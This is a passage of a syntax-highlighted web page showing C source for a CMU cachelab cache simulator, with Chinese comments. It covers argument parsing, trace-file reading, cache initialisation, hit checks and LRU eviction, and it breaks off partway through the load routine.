class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @author: raven</span></span><br><span class="line"><span class="comment"> * @date 2020-7-26</span></span><br><span class="line"><span class="comment"> * @description: 模拟仿真计算机cache的 load modify load过程</span></span><br><span class="line"><span class="comment"> * @issue:</span></span><br><span class="line"><span class="comment"> * 1.没有考虑任何复杂度问题</span></span><br><span class="line"><span class="comment"> * 2.函数没有做安全性检查,比如判定null等</span></span><br><span class="line"><span class="comment"> * 3.main函数中使用到的内存引用没有free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE         <span class="comment">// getline函数不属于c标准, 需要开启GNU扩展</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------前置定义-----------------------*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_NAME_LEN 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OS_PTR_LEN 64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">address64_t</span>;     <span class="comment">// 64-bit address</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG_HIT(verbose) do&#123;<span class="meta-keyword">if</span>(verbose) printf(<span class="meta-string">&quot;hit\n&quot;</span>);&#125;while(0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG_MISS(verbose) do&#123;<span class="meta-keyword">if</span>(verbose) printf(<span class="meta-string">&quot;miss\n&quot;</span>);&#125;while(0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG_EVICT(verbose) do&#123;<span class="meta-keyword">if</span>(verbose) printf(<span class="meta-string">&quot;evict\n&quot;</span>);&#125;while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------数据结构定义-----------------------*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> v;                     <span class="comment">// verbose</span></span><br><span class="line">    <span class="keyword">int</span> s;                     <span class="comment">// set bits 数</span></span><br><span class="line">    <span class="keyword">int</span> E;                     <span class="comment">// E-way</span></span><br><span class="line">    <span class="keyword">int</span> b;                     <span class="comment">// block offset bits</span></span><br><span class="line">    <span class="keyword">char</span> t[FILE_NAME_LEN];     <span class="comment">// trace file path</span></span><br><span class="line">&#125; param;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cache line 结构</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache_line</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> valid;                  <span class="comment">// 有效位</span></span><br><span class="line">    <span class="keyword">int</span> tag;                    <span class="comment">// tag</span></span><br><span class="line"><span class="comment">//    int block_data;             // 存储load到cache的数据，但是由于是模拟，实际这个filed是没用的</span></span><br><span class="line">    <span class="keyword">int</span> age;                    <span class="comment">// age，用于实现LRU替换策略</span></span><br><span class="line">&#125; cache_line;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  trace item结构： 存储trace file中的一行数据（不包括I开头的行)</span></span><br><span class="line"><span class="comment"> *  op_mode: 操作模式： L(load), M(modify), S(store)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> op_mode &#123;</span><br><span class="line">    L = <span class="number">0</span>,                           <span class="comment">// load</span></span><br><span class="line">    M = <span class="number">1</span>,                           <span class="comment">// modify</span></span><br><span class="line">    S = <span class="number">2</span>                            <span class="comment">// store</span></span><br><span class="line">&#125; op_mode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">trace_item</span> &#123;</span></span><br><span class="line">    op_mode mode;                 <span class="comment">// 操作模式</span></span><br><span class="line">    <span class="keyword">address64_t</span> addr;                 <span class="comment">// 地址</span></span><br><span class="line"><span class="comment">//    unsigned int access_size;       // 访问的内存单元数(byte为单位), unsigned int 可以 typedef，但是没想到好名字</span></span><br><span class="line">&#125; trace_item;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * set: cache中的set， 一个set可以由多个line组成</span></span><br><span class="line"><span class="comment"> * cache: 模拟的cache table，cache由多个set组成</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">set</span> &#123;</span></span><br><span class="line">    cache_line *lines;</span><br><span class="line">&#125; <span class="built_in">set</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache</span> &#123;</span></span><br><span class="line">    <span class="built_in">set</span> *sets;</span><br><span class="line">&#125; cache;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------全局变量定义----------------------*/</span></span><br><span class="line"><span class="keyword">char</span> *usage = <span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span></span><br><span class="line">              <span class="string">&quot;Options:\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -h         Print this help message.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -v         Optional verbose flag.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -t &lt;file&gt;  Trace file.\n&quot;</span>;             <span class="comment">// example 略...</span></span><br><span class="line"><span class="comment">// 结果集合</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> hits, miss, evicts;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------操作function定义----------------------*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解析输入参数</span></span><br><span class="line"><span class="comment"> * @param argc</span></span><br><span class="line"><span class="comment"> * @param argv</span></span><br><span class="line"><span class="comment"> * @param p  解析结果放置在p引用的内存中</span></span><br><span class="line"><span class="comment"> * @return 0 success parse</span></span><br><span class="line"><span class="comment"> *         -1 failed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parse_input_params</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], param *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">                p-&gt;v = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                p-&gt;s = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">                p-&gt;E = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                p-&gt;b = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                <span class="built_in">sprintf</span>(p-&gt;t, <span class="string">&quot;%s&quot;</span>, optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, usage);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据字符c_mode,返回对应的op_mode枚举类型</span></span><br><span class="line"><span class="comment"> * @param c_mode</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">op_mode <span class="title">parse_op_mode</span><span class="params">(<span class="keyword">char</span> c_mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (c_mode) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> L;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> M;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> S;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            perror(<span class="string">&quot;can&#x27;t get op mode: invalid char!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解析trace file</span></span><br><span class="line"><span class="comment"> * @param trace_item_ptr 解析结构放置的地方</span></span><br><span class="line"><span class="comment"> * @param trace_item_num trace数组长度</span></span><br><span class="line"><span class="comment"> * @param path 解析文件路径</span></span><br><span class="line"><span class="comment"> * @return  有效的trace item数量</span></span><br><span class="line"><span class="comment"> *          -1 解析失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">parse_trace_file</span><span class="params">(trace_item **trace_item_ptr, <span class="keyword">size_t</span> *trace_item_num, <span class="keyword">const</span> <span class="keyword">char</span> *path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *file = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> *line = <span class="literal">NULL</span>;</span><br><span class="line">    trace_item *trace_items = *trace_item_ptr;</span><br><span class="line">    <span class="keyword">size_t</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(file = fopen(path, <span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">        perror(<span class="string">&quot;trace file not exit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// read entry line by line</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (getline(&amp;line, &amp;len, file) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>)  <span class="comment">// I 指令不需要解析</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*trace_item_num &lt;= i) &#123;</span><br><span class="line">            <span class="comment">// line 过多,超过trace_item_num, 需要重新分配</span></span><br><span class="line">            <span class="keyword">int</span> new_num = *trace_item_num;</span><br><span class="line">            <span class="keyword">do</span> &#123;                    <span class="comment">// 保证new_num 一定要比i大</span></span><br><span class="line">                new_num *= <span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">while</span> (new_num &lt;= i);</span><br><span class="line">            </span><br><span class="line">            trace_items = <span class="built_in">realloc</span>(trace_items, new_num * <span class="keyword">sizeof</span>(trace_item));</span><br><span class="line">            <span class="keyword">if</span> (!trace_items) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;realloc memory for trace item failed\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            *trace_item_ptr = trace_items;</span><br><span class="line">            <span class="comment">// initialize  new alloc memory</span></span><br><span class="line">            <span class="built_in">memset</span>(trace_items + (*trace_item_num), <span class="number">0</span>, (new_num - *trace_item_num) * <span class="keyword">sizeof</span>(trace_item));</span><br><span class="line">            <span class="comment">// update item_num (包含了无效的项)</span></span><br><span class="line">            *trace_item_num = (*trace_item_num) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// mode</span></span><br><span class="line">        trace_items[i].mode = parse_op_mode(line[<span class="number">1</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// address</span></span><br><span class="line">        <span class="keyword">char</span> addr[OS_PTR_LEN + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">3</span>;      <span class="comment">// 代表line中&quot;address&quot;在line中的索引位置</span></span><br><span class="line">        <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 跳过所有</span></span><br><span class="line">        <span class="keyword">while</span> (!<span class="built_in">isdigit</span>(line[j]) &amp;&amp; <span class="built_in">isspace</span>(line[j]))</span><br><span class="line">            ++j;</span><br><span class="line">        offset = j;</span><br><span class="line">        <span class="comment">// 设置address</span></span><br><span class="line">        <span class="keyword">while</span> (line[j] != <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">            addr[j - offset] = line[j];</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        addr[j - offset] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        trace_items[i].addr = strtol(addr, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// byte_nums note: 实际仿真中,这个字段是没用的</span></span><br><span class="line"><span class="comment">//        char buf[10];</span></span><br><span class="line"><span class="comment">//        j++;     // 更新至第一个byte num索引索引位置</span></span><br><span class="line"><span class="comment">//        offset = j;</span></span><br><span class="line"><span class="comment">//        while (line[j] != &#x27;\n&#x27;) &#123;</span></span><br><span class="line"><span class="comment">//            buf[j - offset] = line[j];</span></span><br><span class="line"><span class="comment">//            j++;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        buf[j] = &#x27;\0&#x27;;</span></span><br><span class="line"><span class="comment">//        trace_items[i].access_size = atoi(buf);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// update idx</span></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 删除无用项</span></span><br><span class="line">    *trace_item_num = i;</span><br><span class="line">    *trace_item_ptr = (trace_item *) <span class="built_in">realloc</span>(*trace_item_ptr, <span class="keyword">sizeof</span>(trace_item) * (*trace_item_num));</span><br><span class="line">    </span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化系统cache</span></span><br><span class="line"><span class="comment"> * @param sys_cache</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_cache</span><span class="params">(cache *sys_cache, param *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> S = <span class="number">1</span> &lt;&lt; p-&gt;s;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line"><span class="comment">//    const int B = 1 &lt;&lt; p-&gt;b;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">set</span> *sets = (<span class="built_in">set</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">set</span>) * S);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">        cache_line *cls = (cache_line *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line) * E);</span><br><span class="line">        <span class="comment">// initialize</span></span><br><span class="line">        <span class="built_in">memset</span>(cls, <span class="number">0</span>, <span class="keyword">sizeof</span>(cache_line) * E);</span><br><span class="line">        sets[i].lines = cls;</span><br><span class="line">    &#125;</span><br><span class="line">    sys_cache-&gt;sets = sets;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * check是否命中</span></span><br><span class="line"><span class="comment"> * @param cache_set 需要检测的set</span></span><br><span class="line"><span class="comment"> * @param p    系统参数</span></span><br><span class="line"><span class="comment"> * @param tag  地址中的tag</span></span><br><span class="line"><span class="comment"> * @param cl_idx   如果命中,cl_idx表示当前命中的cacheline在set的中位置(从0开始索引)</span></span><br><span class="line"><span class="comment"> *                 如果未命中,cl_idx = -1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_if_hit</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">size_t</span> *cl_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!cache_set-&gt;lines[i].valid) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (cache_set-&gt;lines[i].tag == tag) &#123;</span><br><span class="line">            *cl_idx = i;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *cl_idx = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span> check_if_hit和check_has_non_block可以做成一个函数,不过这里不考虑效率问题,所以就这样分了</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检验 这组set中,是否还有空block</span></span><br><span class="line"><span class="comment"> * @param cache_set  待检验的set</span></span><br><span class="line"><span class="comment"> * @param p  系统参数</span></span><br><span class="line"><span class="comment"> * @param cl_idx  如果有空块,则cl_idx=找到的第一个空块</span></span><br><span class="line"><span class="comment"> *                如果没有空块,cl_idx=-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_has_empty_block</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">size_t</span> *cl_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!cache_set-&gt;lines[i].valid) &#123;</span><br><span class="line">            *cl_idx = i;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *cl_idx = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 采用LRU算法找到需要evict的cache line索引</span></span><br><span class="line"><span class="comment"> * Note: 本函数假设当前set中没有空块</span></span><br><span class="line"><span class="comment"> * @param cache_set 需要检查的set</span></span><br><span class="line"><span class="comment"> * @param p     系统参数</span></span><br><span class="line"><span class="comment"> * @param cl_idx cl_idx = 找到的cache line在set中的索引</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_evict_cache_line</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">size_t</span> *cl_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line">    <span class="keyword">int</span> min_age_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">1</span>; i &lt; E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_set-&gt;lines[min_age_idx].age &gt; cache_set-&gt;lines[i].age) &#123;</span><br><span class="line">            min_age_idx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *cl_idx = min_age_idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * load 操作</span></span><br><span class="line"><span class="comment"> * @param cache_set</span></span><br><span class="line"><span class="comment"> * @param tag</span></span><br><span class="line"><span class="comment"> * @param age</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_load</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">int</span> age)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> verbose = p-&gt;v;</span><br><span class="line">    <span class="comment">// 首先看能否hit</span></span><br><span class="line">    <span class="keyword">size_t</span> cl_idx;</span><br><span class="line">    check_if_hit(cache_set, p, tag, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 命中</span></span><br><span class="line">    &#123;</span><br><span class="line">        hits++;</span><br><span class="line">        cache_line *cl = &amp;cache_set-&gt;lines[cl_idx];</span><br><span class="line">        cl-&gt;tag = tag;</span><br><span class="line">        cl-&gt;age = age;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 未命中,查看是否有空块</span></span><br><span class="line">    check_has_empty_block(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 有空块</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        cache_line *cl = &amp;cache_set-&gt;lines[cl_idx];</span><br><span class="line">   